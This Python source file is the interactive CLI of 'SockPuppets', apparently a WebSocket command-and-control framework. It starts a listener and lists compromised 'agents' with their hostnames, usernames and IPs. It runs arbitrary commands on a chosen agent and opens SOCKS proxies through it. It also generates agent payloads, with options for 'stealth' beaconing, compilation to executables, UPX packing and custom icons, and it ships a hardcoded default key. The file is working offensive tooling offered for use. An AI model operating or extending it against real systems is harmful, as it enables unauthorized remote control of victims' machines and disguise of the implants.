#!/usr/bin/env python3
"""
SockPuppets - WebSocket Framework
Main CLI Interface
"""

import asyncio
import cmd
import sys
import os
from pathlib import Path
from agent import AgentGenerator
from server import get_server_instance, start_server
import threading


ASCII_ART = r"""
 _____ _____ _____ _____ _____ _____ _____ _____ _____ _____ _____
|   __|     |     |  |  |  _  |  |  |  _  |  _  |   __|_   _|   __|
|__   |  |  |   --|    -|   __|  |  |   __|   __|   __|  |  |__   |
|_____|_____|_____|__|__|__|  |_____|__|  |__|  |_____|  |  |_____|

                    by AJ Hammond @ajm4n
"""


class SockPuppetsCLI(cmd.Cmd):
    """Interactive CLI for SockPuppets"""

    intro = ASCII_ART + "\nType 'help' for available commands.\n"
    prompt = "\033[1;36msockpuppets>\033[0m "

    def __init__(self):
        super().__init__()
        self.server = None
        self.server_running = False
        self.current_agent = None
        self.loop = None
        self.encryption_key = 'SOCKPUPPETS_KEY_2026'

    def do_start(self, arg):
        """Start the server: start [host] [port] [--key=<encryption_key>]"""
        if self.server_running:
            print("[-] Server is already running")
            return

        args = arg.split()
        host = '0.0.0.0'
        port = 8443
        key = self.encryption_key

        for arg in args:
            if arg.startswith('--key='):
                key = arg.split('=', 1)[1]
                self.encryption_key = key
            elif args.index(arg) == 0 and not arg.startswith('--'):
                host = arg
            elif args.index(arg) == 1 and not arg.startswith('--'):
                try:
                    port = int(arg)
                except ValueError:
                    print("[-] Invalid port number")
                    return

        print(f"[*] Starting server on {host}:{port}...")

        def run_server():
            self.loop = asyncio.new_event_loop()
            asyncio.set_event_loop(self.loop)
            self.loop.run_until_complete(start_server(host, port, key))

        thread = threading.Thread(target=run_server, daemon=True)
        thread.start()

        import time
        time.sleep(1)

        self.server = get_server_instance()
        self.server_running = True
        print(f"[+] Server started on {host}:{port}")
        if key != 'SOCKPUPPETS_KEY_2026':
            print(f"[+] Using custom encryption key")

    def do_stop(self, arg):
        """Stop the server"""
        if not self.server_running:
            print("[-] Server is not running")
            return

        print("[*] Stopping server...")
        self.server_running = False
        self.server = None
        print("[+] Server stopped")

    def do_agents(self, arg):
        """List all agents"""
        if not self.server_running:
            print("[-] Server is not running. Start it first with 'start'")
            return

        agents = self.server.get_agent_list()
        if not agents:
            print("[-] No agents connected")
            return

        print("\n\033[1mConnected Agents:\033[0m")
        print("=" * 80)
        for agent in agents:
            status = "\033[92m●\033[0m" if agent in self.server.get_active_agents() else "\033[91m●\033[0m"
            mode_badge = "\033[93m[BEACON]\033[0m" if agent['mode'] == 'beacon' else "\033[92m[STREAM]\033[0m"
            print(f"{status} \033[1m{agent['id']}\033[0m {mode_badge}")
            print(f"   Hostname:   {agent['hostname']}")
            print(f"   Username:   {agent['username']}")
            print(f"   OS:         {agent['os']}")
            print(f"   IP:         {agent['ip']}")
            print(f"   Connected:  {agent['connected_at']}")
            print(f"   Last Seen:  {agent['last_seen']}")
            if agent['mode'] == 'beacon':
                print(f"   Beacon:     {agent['beacon_interval']}s interval")
            print()

    def do_interact(self, arg):
        """Interact with an agent: interact <agent_id>"""
        if not self.server_running:
            print("[-] Server is not running")
            return

        if not arg:
            print("[-] Usage: interact <agent_id>")
            return

        agent_id = arg.strip()
        agents = {a['id']: a for a in self.server.get_agent_list()}

        if agent_id not in agents:
            print(f"[-] Agent {agent_id} not found")
            return

        active_agents = {a['id']: a for a in self.server.get_active_agents()}
        if agent_id not in active_agents:
            print(f"[-] Agent {agent_id} is not active")
            return

        self.current_agent = agent_id
        agent_info = agents[agent_id]
        mode = agent_info['mode']
        print(f"[+] Interacting with agent {agent_id} ({agent_info['hostname']})")
        print(f"[*] Mode: {mode.upper()}")
        if mode == 'beacon':
            print(f"[*] Beacon interval: {agent_info['beacon_interval']}s")
        print("[*] Type 'back' to return to main menu")
        print("[*] Type 'socks <port>' to start SOCKS proxy")
        print("[*] Type 'sleep <seconds>' to set beacon interval")
        print("[*] Type 'upgrade' to switch to streaming mode")
        print("[*] Type 'downgrade [seconds]' to switch to beacon mode")

        while self.current_agent:
            try:
                command = input(f"\033[1;33magent[{agent_id}]>\033[0m ").strip()

                if command.lower() == 'back':
                    self.current_agent = None
                    print("[*] Returning to main menu")
                    break

                if command.lower().startswith('socks'):
                    parts = command.split()
                    if len(parts) != 2:
                        print("[-] Usage: socks <port>")
                        continue

                    try:
                        socks_port = int(parts[1])
                        if not self.loop:
                            print("[-] Event loop not available")
                            continue

                        future = asyncio.run_coroutine_threadsafe(
                            self.server.start_socks_proxy(agent_id, socks_port),
                            self.loop
                        )
                        result = future.result(timeout=5)
                        print(f"[+] {result}")
                    except ValueError:
                        print("[-] Invalid port number")
                    except Exception as e:
                        print(f"[-] Error: {str(e)}")
                    continue

                if command.lower().startswith('sleep'):
                    parts = command.split()
                    if len(parts) != 2:
                        print("[-] Usage: sleep <seconds>")
                        continue

                    try:
                        interval = int(parts[1])
                        if not self.loop:
                            print("[-] Event loop not available")
                            continue

                        future = asyncio.run_coroutine_threadsafe(
                            self.server.set_beacon_interval(agent_id, interval),
                            self.loop
                        )
                        result = future.result(timeout=5)
                        print(f"[+] {result}")
                    except ValueError:
                        print("[-] Invalid interval")
                    except Exception as e:
                        print(f"[-] Error: {str(e)}")
                    continue

                if command.lower() == 'upgrade':
                    if not self.loop:
                        print("[-] Event loop not available")
                        continue

                    try:
                        future = asyncio.run_coroutine_threadsafe(
                            self.server.upgrade_to_streaming(agent_id),
                            self.loop
                        )
                        result = future.result(timeout=5)
                        print(f"[+] {result}")
                    except Exception as e:
                        print(f"[-] Error: {str(e)}")
                    continue

                if command.lower().startswith('downgrade'):
                    parts = command.split()
                    interval = 60
                    if len(parts) == 2:
                        try:
                            interval = int(parts[1])
                        except ValueError:
                            print("[-] Invalid interval")
                            continue

                    if not self.loop:
                        print("[-] Event loop not available")
                        continue

                    try:
                        future = asyncio.run_coroutine_threadsafe(
                            self.server.downgrade_to_beacon(agent_id, interval),
                            self.loop
                        )
                        result = future.result(timeout=5)
                        print(f"[+] {result}")
                    except Exception as e:
                        print(f"[-] Error: {str(e)}")
                    continue

                if not command:
                    continue

                if not self.loop:
                    print("[-] Event loop not available")
                    break

                future = asyncio.run_coroutine_threadsafe(
                    self.server.send_command_to_agent(agent_id, command),
                    self.loop
                )

                print("[*] Executing command...")
                result = future.result(timeout=35)
                print(result)

            except KeyboardInterrupt:
                print("\n[*] Use 'back' to return to main menu")
            except Exception as e:
                print(f"[-] Error: {str(e)}")

    def do_generate(self, arg):
        """Generate agents: generate <host> <port> [options]"""
        args = arg.split()

        if len(args) < 2:
            print("[-] Usage: generate <host> <port> [options]")
            print("    Options:")
            print("      --beacon               Enable beacon mode")
            print("      --interval=N           Beacon interval in seconds")
            print("      --compile              Compile Python agent to executable")
            print("      --arch=ARCH            Target architecture (x86, x64, arm64)")
            print("      --multi-arch           Compile for all architectures")
            print("      --no-upx               Disable UPX compression")
            print("      --icon=PATH            Icon file for executable")
            print("      --key=KEY              Encryption key")
            return

        host = None
        port = None
        key = self.encryption_key
        compile_exe = False
        beacon_mode = False
        beacon_interval = 60
        architectures = ['x64']
        use_upx = True
        icon = None

        for arg in args:
            if arg.startswith('--key='):
                key = arg.split('=', 1)[1]
            elif arg.startswith('--interval='):
                try:
                    beacon_interval = int(arg.split('=', 1)[1])
                except ValueError:
                    print("[-] Invalid interval value")
                    return
            elif arg.startswith('--arch='):
                arch = arg.split('=', 1)[1]
                if arch in ['x86', 'x64', 'arm64']:
                    architectures = [arch]
                else:
                    print(f"[-] Invalid architecture: {arch}")
                    return
            elif arg.startswith('--icon='):
                icon = arg.split('=', 1)[1]
                if not os.path.exists(icon):
                    print(f"[-] Icon file not found: {icon}")
                    return
            elif arg == '--compile':
                compile_exe = True
            elif arg == '--beacon':
                beacon_mode = True
            elif arg == '--multi-arch':
                architectures = ['x86', 'x64', 'arm64']
                compile_exe = True
            elif arg == '--no-upx':
                use_upx = False
            elif host is None:
                host = arg
            elif port is None:
                try:
                    port = int(arg)
                except ValueError:
                    print("[-] Invalid port number")
                    return

        if not host or port is None:
            print("[-] Usage: generate <host> <port> [options]")
            return

        print(f"[*] Generating agents for {host}:{port}...")
        if key != 'SOCKPUPPETS_KEY_2026':
            print(f"[*] Using custom encryption key")
        if beacon_mode:
            print(f"[*] Beacon mode enabled ({beacon_interval}s interval)")
        if compile_exe:
            print(f"[*] Compilation enabled for: {', '.join(architectures)}")
            if use_upx:
                print(f"[*] UPX compression enabled")
            if icon:
                print(f"[*] Using icon: {icon}")

        generator = AgentGenerator()
        results = generator.generate_all(host, port, key, beacon_mode, beacon_interval,
                                        compile_exe, architectures, use_upx, icon)

        print("\n[+] Agent generation complete!")
        print("=" * 60)
        for agent_type, path in results.items():
            if not path.startswith('Error'):
                print(f"  {agent_type.upper()}: {path}")
            else:
                print(f"  {agent_type.upper()}: {path}")

    def do_clear(self, arg):
        """Clear the screen"""
        os.system('clear' if os.name != 'nt' else 'cls')
        print(ASCII_ART)

    def do_exit(self, arg):
        """Exit the program"""
        if self.server_running:
            print("[*] Stopping server...")
            self.server_running = False

        print("[*] Goodbye!")
        sys.exit(0)

    def do_quit(self, arg):
        """Exit the program"""
        return self.do_exit(arg)

    def do_help(self, arg):
        """Show help menu"""
        if arg:
            super().do_help(arg)
            return

        print("\n\033[1mAvailable Commands:\033[0m")
        print("=" * 70)
        print("  \033[1mstart [host] [port] [--key=K]\033[0m       - Start the server")
        print("  \033[1mstop\033[0m                                 - Stop the server")
        print("  \033[1magents\033[0m                               - List all connected agents")
        print("  \033[1minteract <agent_id>\033[0m                  - Interact with an agent")
        print("  \033[1mgenerate <host> <port> [opts]\033[0m       - Generate agent payloads")
        print("  \033[1mclear\033[0m                                - Clear the screen")
        print("  \033[1mexit/quit\033[0m                            - Exit the program")
        print()
        print("\033[1mGenerate Options:\033[0m")
        print("=" * 70)
        print("  \033[1m--beacon\033[0m              Enable beacon mode (stealth)")
        print("  \033[1m--interval=N\033[0m          Beacon check-in interval in seconds")
        print("  \033[1m--compile\033[0m             Compile Python agent to executable")
        print("  \033[1m--arch=ARCH\033[0m           Target architecture (x86, x64, arm64)")
        print("  \033[1m--multi-arch\033[0m          Compile for all architectures")
        print("  \033[1m--no-upx\033[0m              Disable UPX compression")
        print("  \033[1m--icon=PATH\033[0m           Custom icon for executable")
        print("  \033[1m--key=KEY\033[0m             Custom encryption key")
        print()
        print("\033[1mAgent Commands:\033[0m")
        print("=" * 70)
        print("  \033[1mback\033[0m                  Return to main menu")
        print("  \033[1msocks <port>\033[0m          Start SOCKS5 proxy on port")
        print("  \033[1msleep <seconds>\033[0m       Set beacon interval")
        print("  \033[1mupgrade\033[0m               Upgrade to streaming mode")
        print("  \033[1mdowngrade [seconds]\033[0m   Downgrade to beacon mode")
        print("  \033[1m<any command>\033[0m         Execute command on agent")
        print()


def main():
    """Main entry point"""
    try:
        cli = SockPuppetsCLI()
        cli.cmdloop()
    except KeyboardInterrupt:
        print("\n[*] Exiting...")
        sys.exit(0)


if __name__ == '__main__':
    main()
